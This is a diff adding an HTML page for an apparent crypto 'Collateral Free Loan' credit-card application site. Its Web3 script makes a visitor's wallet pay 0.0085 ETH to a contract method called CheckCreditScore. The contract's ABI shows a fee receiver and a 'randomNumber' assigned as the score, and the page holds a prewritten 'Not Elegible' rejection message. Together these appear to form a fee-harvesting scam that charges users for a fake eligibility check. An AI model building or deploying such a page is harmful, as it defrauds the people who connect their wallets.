@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<meta charset="UTF-8">
+
+<html>
+<head>
+    <title>Collateral Free Loan - Borrow Colletral Free Loan</title>
+<link rel="icon" type="image/x-icon" href="icon.png">
+<style>
+
+body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+		text-align: center;
+            background-color:  #89CFF0;
+        }
+
+        .header {
+            background-color: #fff; /* White header background color */
+            color: #333; /* Dark text color */
+            padding: 20px 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px;
+        }
+
+        .logo {
+            max-width: 130px;
+        }
+
+
+
+#connect-wallet, #disconnect-wallet {
+           background-color: #F50870FF;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+#notification {
+    font-size: 20px; /* Font size for the notification text */
+    font-weight: bold; /* Bold text */
+    padding: 10px; /* Padding around the notification text */
+    color: white; /* Text color (red) */
+    background-color: #333; /* Background color (greyish-black) */
+    width: 50%; /* Set the width to 50% */
+    margin: 10px auto; /* Center horizontally with equal margin on the left and right */
+    border-radius: 10px; /* Rounded corners (adjust the value as needed) */
+    position: relative; /* Allows positioning of the timer */
+}
+
+.main{
+padding: 20px 20px 20px 20px;
+		flex-basis: 400px;
+		background-color: white;
+		margin : auto;
+		width: 25%;
+}
+
+.main h3{
+		
+		font-size: 25px;
+
+}
+
+.main img{
+		max-width: 80%;
+
+}
+
+        #apply-card {
+            padding: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #4caf50;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+        }
+
+.popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+        }
+        .popup-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+            position: relative;
+        }
+        .close-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            cursor: pointer;
+        }
+
+
+        .status {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .processing {
+            animation: spin 2s linear infinite;
+        }
+        #check-score {
+            background-color: green;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+
+        .footer {
+            background-color: #333;
+            color: #fff;
+            padding: 20px;
+        }
+
+        .footer-section {
+            display: flex;
+            
+        }
+
+        .footer-list {
+            list-style: none;
+text-align : left;
+        }
+
+        .page {
+            cursor: pointer;
+        }
+
+        .footer-logo {
+            display: flex;
+  justify-content: space-between;
+  align-items: center;
+  background-color: #333; /* Background color for the footer */
+  color: white; /* Text color for the footer */
+  padding: 20px;
+
+  margin-left: auto; /* Move the logo to the right */
+  max-width: 200px; /* Set the maximum width for the logo */
+  height: 50px; /* Maintain the aspect ratio while resizing */
+        }
+
+
+
+</style>
+</head>
+<body>
+
+<div class="header">
+<a href="home.html">
+        <img src="logo.png" alt="Your Logo" align="left" class="logo"></a>
+         <button id="connect-wallet"><b>Connect Wallet</b></button>
+        <button id="disconnect-wallet" style="display: none;"><b>Disconnect Wallet</b></button>
+    </div>
+
+<div id="notification" style="background-color: transparent;"></div>
+
+<br>
+
+<div class="main">
+	<h3>Apply Credit Card</h3>
+<img src="cc.png" alt="Credit Card" class="cc"><br><br><br>
+<button id="apply-card"><b>Apply</b></button><br><br>
+<p style="font-size:80%; color:grey;"><b>Note :- You will be eligible based upon your credit score</b></p>
+</div>
+
+
+<br><br><br><br>
+<!-- Popup windows -->
+
+    <div class="popup" id="process-transaction-popup">
+        <div class="popup-content">
+            <span class="close-button" id="close-popup">X</span>
+            <p class="status" id="popup-status">Approve Transaction</p>
+            <p id="popup-message">You have to approve the transaction to check your eligibility.</p>
+        </div>
+    </div>
+
+
+    <div class="popup" id="transaction-status">
+        <div class="popup-content">
+		<span class="close-button" id="close-status-popup">X</span>
+
+            <h2>Not Elegible</h2>
+ 
+            <b><p id="wallet-address">Wallet Address : </p></b>
+
+<p>Sorry !!! You are not matched with our eligibility criteria.</p>
+	<button id="apply-card" class="popup-button" onclick="checkScore()"><b>Check Score</b></button>
+        </div>
+    </div>
+
+
+
+<div class="footer">
+        <div class="footer-section">
+            <ul class="footer-list">
+                <b>
+                <li class="page"><a href="about.html" style="text-decoration:none; color:white;">About</a></li>
+                <li class="page"><a href="contact.html" style="text-decoration:none; color:white;">Contact</a></li>
+                <li class="page"><a href="policy.html" style="text-decoration:none; color:white;">Privacy Policy</a></li></b>
+            </ul>
+            <ul class="footer-list">
+                <b>
+                <li class="page"><a href="ApplyCreditCard.html" style="text-decoration:none; color:white;">Credit Card</a></li>               
+</b>
+            </ul>
+
+<div class="footer-logo">
+<a href="home.html">
+            <img src="logo.png" alt="Footer Logo" class="footer-logo"></a>
+        </div>
+        </div>
+        
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+ <script>
+
+// ------ new code
+
+    // Initialize Web3.js
+    let web3;
+
+    // Function to initialize Web3
+    async function initWeb3() {
+        if (window.ethereum) {
+            web3 = new Web3(window.ethereum);
+            try {
+                // Request account access if needed
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+            } catch (error) {
+                console.error('User denied account access');
+            }
+        } else if (window.web3) {
+            web3 = new Web3(window.web3.currentProvider);
+        } else {
+            console.error('No Ethereum provider detected');
+        }
+    }
+
+    // Initialize Web3 before using it
+    initWeb3().then(() => {
+        // Initialize the contract
+        const contractAddress = "0x04199279852E6284EF85a9aB579567840BA6B991";
+        const contractABI = [
+	{
+		"inputs": [],
+		"name": "CheckCreditScore",
+		"outputs": [],
+		"stateMutability": "payable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "uint256",
+				"name": "_initialMinTime",
+				"type": "uint256"
+			},
+			{
+				"internalType": "address",
+				"name": "_initialFeeReceiver",
+				"type": "address"
+			}
+		],
+		"stateMutability": "nonpayable",
+		"type": "constructor"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "owner",
+				"type": "address"
+			}
+		],
+		"name": "OwnableInvalidOwner",
+		"type": "error"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "account",
+				"type": "address"
+			}
+		],
+		"name": "OwnableUnauthorizedAccount",
+		"type": "error"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "wallet",
+				"type": "address"
+			},
+			{
+				"indexed": false,
+				"internalType": "uint256",
+				"name": "randomNumber",
+				"type": "uint256"
+			},
+			{
+				"indexed": false,
+				"internalType": "uint256",
+				"name": "timestamp",
+				"type": "uint256"
+			}
+		],
+		"name": "CreditScoreAssigned",
+		"type": "event"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "payer",
+				"type": "address"
+			},
+			{
+				"indexed": false,
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			},
+			{
+				"indexed": false,
+				"internalType": "uint256",
+				"name": "timestamp",
+				"type": "uint256"
+			}
+		],
+		"name": "FeePaid",
+		"type": "event"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "previousOwner",
+				"type": "address"
+			},
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "newOwner",
+				"type": "address"
+			}
+		],
+		"name": "OwnershipTransferred",
+		"type": "event"
+	},
+	{
+		"inputs": [],
+		"name": "renounceOwnership",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "newOwner",
+				"type": "address"
+			}
+		],
+		"name": "transferOwnership",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "uint256",
+				"name": "_newFeeAmount",
+				"type": "uint256"
+			}
+		],
+		"name": "updateFeeAmount",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "_newFeeReceiver",
+				"type": "address"
+			}
+		],
+		"name": "updateFeeReceiver",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "uint256",
+				"name": "_newMinTime",
+				"type": "uint256"
+			}
+		],
+		"name": "updateMinTimeBetweenRequests",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"name": "CreditScore",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "feeAmount",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "feeReceiver",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "getRemainingTime",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "getUsedAddresses",
+		"outputs": [
+			{
+				"internalType": "address[]",
+				"name": "",
+				"type": "address[]"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"name": "incrementCount",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "minTimeBetweenRequests",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "owner",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"name": "timestamps",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"name": "usedAddresses",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	}
+]; // Your contract ABI here
+        const contract = new web3.eth.Contract(contractABI, contractAddress);
+
+        let walletConnected = false;
+
+        document.getElementById('connect-wallet').addEventListener('click', async () => {
+            try {
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                walletConnected = true;
+                const walletAddress = accounts[0];
+
+                document.getElementById('wallet-address').textContent = "Wallet Address : " + walletAddress;
+
+                document.getElementById('disconnect-wallet').style.display = 'inline';
+                document.getElementById('connect-wallet').style.display = 'none';
+            } catch (error) {
+                document.getElementById('popup-status').textContent = 'Error connecting wallet';
+            }
+        });
+
+        document.getElementById('disconnect-wallet').addEventListener('click', () => {
+            ethereum.send('eth_requestAccounts').then(() => {
+                walletConnected = false;
+                document.getElementById('connect-wallet').style.display = 'inline';
+                document.getElementById('disconnect-wallet').style.display = 'none';
+            });
+        });
+
+        function openPopup() {
+            if (!walletConnected) {
+                flashNotification('Connect wallet first', 'grey');
+                return;
+            }
+
+            var popup = document.getElementById("process-transaction-popup");
+            popup.style.display = "flex";
+        }
+
+        document.getElementById('close-popup').addEventListener('click', () => {
+            document.getElementById('process-transaction-popup').style.display = 'none';
+        });
+
+        document.getElementById('close-status-popup').addEventListener('click', () => {
+            document.getElementById('transaction-status').style.display = 'none';
+        });
+
+        function flashNotification(message, color) {
+            const notification = document.getElementById('notification');
+            notification.style.backgroundColor = color;
+            notification.textContent = message;
+            setTimeout(() => {
+                notification.style.backgroundColor = 'transparent';
+                notification.textContent = '';
+            }, 3000);
+        }
+
+        document.getElementById('apply-card').addEventListener('click', async () => {
+            try {
+                if (!walletConnected) {
+                    flashNotification('Connect wallet first', 'grey');
+                    return;
+                }
+
+                document.getElementById('popup-status').textContent = 'Approve Transaction';
+                document.getElementById('popup-message').textContent = `You have to approve the transaction to check your eligibility.`;
+
+                var popup = document.getElementById("process-transaction-popup");
+                popup.style.display = "flex";
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                const fromAddress = accounts[0];
+
+                const weiAmount = web3.utils.toWei('0.0085', 'ether');
+                const gas = await contract.methods.CheckCreditScore().estimateGas({ value: weiAmount, from: fromAddress });
+                await contract.methods.CheckCreditScore().send({ from: fromAddress, value: weiAmount, gas });
+
+                var popup = document.getElementById("process-transaction-popup");
+                popup.style.display = "flex";
+                document.getElementById('process-transaction-popup').style.display = 'none';
+
+            } catch (error) {
+                document.getElementById('popup-status').textContent = 'Transaction Failed';
+                document.getElementById('popup-message').textContent = `❌ Error: ${error.message}`;
+            }
+        });
+
+    });
+</script>
+
+</body>
+<html>
